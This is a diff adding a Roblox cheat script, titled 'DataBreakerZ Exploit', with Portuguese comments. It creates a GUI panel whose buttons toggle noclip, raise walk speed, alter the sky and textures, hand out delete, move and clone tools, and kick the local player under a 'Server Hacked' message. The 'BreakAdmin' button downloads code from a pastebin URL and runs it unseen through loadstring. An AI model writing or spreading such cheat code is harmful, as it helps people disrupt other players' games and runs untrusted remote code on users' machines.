@@ -1,0 +1,338 @@
+-- DataBreakerZ - Roblox Exploit (CoreGui Version)
+
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+-- Cria a GUI no CoreGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DataBreakerZ"
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- Frame principal
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 400, 0, 300)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Active = true
+Frame.Draggable = true
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+-- Título
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "DataBreakerZ Exploit"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextScaled = true
+Title.BorderSizePixel = 0
+Title.Parent = Frame
+
+-- Botões minimizar e fechar
+local MinButton = Instance.new("TextButton")
+MinButton.Size = UDim2.new(0, 40, 0, 40)
+MinButton.Position = UDim2.new(1, -80, 0, 0)
+MinButton.Text = "_"
+MinButton.TextColor3 = Color3.new(1,1,1)
+MinButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
+MinButton.BorderSizePixel = 0
+MinButton.Parent = Frame
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 40, 0, 40)
+CloseButton.Position = UDim2.new(1, -40, 0, 0)
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.new(1,1,1)
+CloseButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
+CloseButton.BorderSizePixel = 0
+CloseButton.Parent = Frame
+
+-- Texto Loading
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, 0, 1, -40)
+LoadingText.Position = UDim2.new(0, 0, 0, 40)
+LoadingText.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingText.Text = "Loading..."
+LoadingText.Font = Enum.Font.SourceSansBold
+LoadingText.TextScaled = true
+LoadingText.BorderSizePixel = 0
+LoadingText.Parent = Frame
+
+-- ScrollingFrame (rolável) para os botões
+local Content = Instance.new("ScrollingFrame")
+Content.Size = UDim2.new(1, 0, 1, -40)
+Content.Position = UDim2.new(0, 0, 0, 40)
+Content.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+Content.BorderSizePixel = 0
+Content.CanvasSize = UDim2.new(0, 0, 0, 860)
+Content.ScrollBarThickness = 8
+Content.ScrollingDirection = Enum.ScrollingDirection.Y
+Content.Visible = false
+Content.Parent = Frame
+
+-- Variável para controle do estado minimizado
+local minimized = false
+
+-- Função minimizar
+MinButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        Content.Visible = false
+        Frame.Size = UDim2.new(0, 400, 0, 40)
+    else
+        Content.Visible = true
+        Frame.Size = UDim2.new(0, 400, 0, 300)
+    end
+end)
+
+-- Função fechar
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Função para criar botões no Content
+local function CreateButton(text, posY)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.9, 0, 0, 40)
+    btn.Position = UDim2.new(0.05, 0, 0, posY)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextScaled = true
+    btn.BorderSizePixel = 0
+    btn.Parent = Content
+    return btn
+end
+
+-- Função para notificação
+local function Notify(text)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "DataBreakerZ",
+        Text = text,
+        Duration = 5
+    })
+end
+
+-- Funções usadas nos botões (RedVision, SpawnDummy, ChangeSky, BlackScreen, ChangeTextures)...
+-- [Você pode copiar as funções do script anterior aqui para manter organizado]
+
+-- Por exemplo:
+local function RedVision()
+    local cc = Instance.new("ColorCorrectionEffect", Lighting)
+    cc.Name = "RedVision"
+    cc.TintColor = Color3.fromRGB(255, 0, 0)
+    cc.Brightness = 0.1
+    cc.Contrast = 0.2
+    cc.Saturation = -0.3
+    task.delay(10, function() cc:Destroy() end)
+end
+
+local function SpawnDummy()
+    local dummy = Instance.new("Model", workspace)
+    dummy.Name = "DataBreakerZ_Dummy"
+    local part = Instance.new("Part", dummy)
+    part.Size = Vector3.new(2, 5, 2)
+    part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
+    part.Anchored = true
+    part.BrickColor = BrickColor.new("Really red")
+    local hum = Instance.new("Humanoid", dummy)
+    hum.Health = 0
+    task.delay(10, function() dummy:Destroy() end)
+end
+
+local function ChangeSky()
+    local sky = Instance.new("Sky", Lighting)
+    sky.SkyboxBk = "rbxassetid://979471376"
+    sky.SkyboxDn = "rbxassetid://979471376"
+    sky.SkyboxFt = "rbxassetid://979471376"
+    sky.SkyboxLf = "rbxassetid://979471376"
+    sky.SkyboxRt = "rbxassetid://979471376"
+    sky.SkyboxUp = "rbxassetid://979471376"
+end
+
+local function BlackScreen(duration)
+    local gui = Instance.new("ScreenGui", player.PlayerGui)
+    gui.Name = "BlackScreen"
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(1,0,1,0)
+    frame.Position = UDim2.new(0,0,0,0)
+    frame.BackgroundColor3 = Color3.new(0,0,0)
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 999
+    task.delay(duration, function() gui:Destroy() end)
+end
+
+local function ChangeTextures()
+    for _,v in pairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.TextureID = ""
+            local tex = v:FindFirstChildOfClass("Texture")
+            if tex then
+                tex.Texture = "rbxassetid://73433843394532"
+            else
+                tex = Instance.new("Texture", v)
+                tex.Texture = "rbxassetid://73433843394532"
+            end
+        end
+    end
+end
+
+local function PlaySound(id, time)
+    local sound = Instance.new("Sound", workspace)
+    sound.SoundId = "rbxassetid://"..id
+    sound.Volume = 5
+    sound.Looped = false
+    sound:Play()
+    if time then
+        task.delay(time, function()
+            sound:Destroy()
+        end)
+    else
+        sound.Ended:Connect(function()
+            sound:Destroy()
+        end)
+    end
+end
+
+-- Função para criar as ferramentas F3X (Delete, Move, Clone)
+local function GiveF3XTools()
+    Notify("Use at your pleasure")
+
+    -- Delete Tool
+    local delete = Instance.new("Tool")
+    delete.Name = "Delete"
+    delete.RequiresHandle = false
+    delete.Parent = player.Backpack
+
+    local delScript = Instance.new("LocalScript", delete)
+    delScript.Source = [[
+        local mouse = game.Players.LocalPlayer:GetMouse()
+        mouse.Button1Down:Connect(function()
+            if mouse.Target then
+                mouse.Target:Destroy()
+            end
+        end)
+    ]]
+
+    -- Move Tool
+    local move = Instance.new("Tool")
+    move.Name = "Move"
+    move.RequiresHandle = false
+    move.Parent = player.Backpack
+
+    local moveScript = Instance.new("LocalScript", move)
+    moveScript.Source = [[
+        local UIS = game:GetService("UserInputService")
+        local mouse = game.Players.LocalPlayer:GetMouse()
+        local dragging = false
+        local target = nil
+
+        mouse.Button1Down:Connect(function()
+            if mouse.Target then
+                dragging = true
+                target = mouse.Target
+            end
+        end)
+
+        mouse.Button1Up:Connect(function()
+            dragging = false
+        end)
+
+        UIS.InputChanged:Connect(function(input)
+            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                if target then
+                    target.Position = mouse.Hit.p
+                end
+            end
+        end)
+    ]]
+
+    -- Clone Tool
+    local clone = Instance.new("Tool")
+    clone.Name = "Clone"
+    clone.RequiresHandle = false
+    clone.Parent = player.Backpack
+
+    local cloneScript = Instance.new("LocalScript", clone)
+    cloneScript.Source = [[
+        local mouse = game.Players.LocalPlayer:GetMouse()
+        mouse.Button1Down:Connect(function()
+            if mouse.Target then
+                local new = mouse.Target:Clone()
+                new.Parent = workspace
+                new.Position = mouse.Target.Position + Vector3.new(2,2,2)
+            end
+        end)
+    ]]
+end
+
+-- Depois do delay mostra os botões e cria eles
+task.delay(2, function()
+    LoadingText.Visible = false
+    Content.Visible = true
+
+    PlaySound("1838684094", 10)
+
+    local btn1 = CreateButton("Killing DataBreakerZ", 10)
+    btn1.MouseButton1Click:Connect(function()
+        RedVision()
+        SpawnDummy()
+        PlaySound("1838666492")
+        Notify("DataBreakerZ is Back")
+
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = humanoid.WalkSpeed + 100
+        end
+    end)
+
+    local btn2 = CreateButton("Let's Get Started", 60)
+    btn2.MouseButton1Click:Connect(function()
+        ChangeSky()
+        PlaySound("18925320031")
+    end)
+
+    local btn3 = CreateButton("Noclip Hacker", 110)
+    btn3.MouseButton1Click:Connect(function()
+        local noclip = true
+        RunService.Stepped:Connect(function()
+            if noclip and player.Character then
+                for _,v in pairs(player.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.CanCollide = false
+                    end
+                end
+            end
+        end)
+    end)
+
+    local btn4 = CreateButton("Hack", 160)
+    btn4.MouseButton1Click:Connect(function()
+        player:Kick("Server Hacked")
+    end)
+
+    local btn5 = CreateButton("Run", 210)
+    btn5.MouseButton1Click:Connect(function()
+        Notify("Server Hacker")
+        BlackScreen(2)
+        ChangeTextures()
+        PlaySound("1838666492")
+    end)
+
+    local btn6 = CreateButton("F3X Tool", 260)
+    btn6.MouseButton1Click:Connect(function()
+        GiveF3XTools()
+    end)
+
+    local btn7 = CreateButton("BreakAdmin", 310)
+    btn7.MouseButton1Click:Connect(function()
+        Notify("PrizzLife Admin Loaded")
+        loadstring(game:HttpGet("https://pastebin.com/raw/1vxjz2t3"))()
+    end)
+end)
